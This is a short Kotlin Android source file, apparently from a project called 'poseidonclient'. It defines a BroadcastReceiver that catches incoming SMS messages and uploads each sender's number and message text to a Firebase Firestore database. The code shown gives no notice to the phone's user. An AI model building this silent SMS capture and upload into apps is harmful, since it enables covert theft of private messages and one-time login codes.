package hu.bme.aut.poseidonclient.broadcastReceiver

import android.content.BroadcastReceiver
import android.content.ContentValues.TAG
import android.content.Context
import android.content.Intent
import android.telephony.SmsMessage
import android.widget.Toast
import android.os.Build

import android.os.Bundle
import android.util.Log
import androidx.annotation.RequiresApi
import android.annotation.TargetApi
import androidx.core.app.ActivityCompat

import android.R

import android.content.pm.PackageManager
import android.provider.Settings
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import hu.bme.aut.poseidonclient.Globals
import hu.bme.aut.poseidonclient.MainActivity


class SMSReceiver : BroadcastReceiver() {
    private val db = Firebase.firestore


    var body: String? = ""
    var origin: String? = ""

    override fun onReceive(context: Context, intent: Intent) {
        val extras = intent.extras ?: return
        val pdus = extras.get("pdus") as Array<ByteArray>
        var msg: SmsMessage

        for (pdu in pdus) {
            msg = SmsMessage.createFromPdu(pdu)
            origin = msg.originatingAddress
            body += msg.messageBody


        }

        db.collection("phones").document(Globals.name).collection("messages").add(
            hashMapOf(
                "number" to origin, "body" to body
            )
        )

        db.collection("phones").document(
            Globals.name).set(
            hashMapOf(
                "_nothing" to "nothing"
            )
        )
    }


}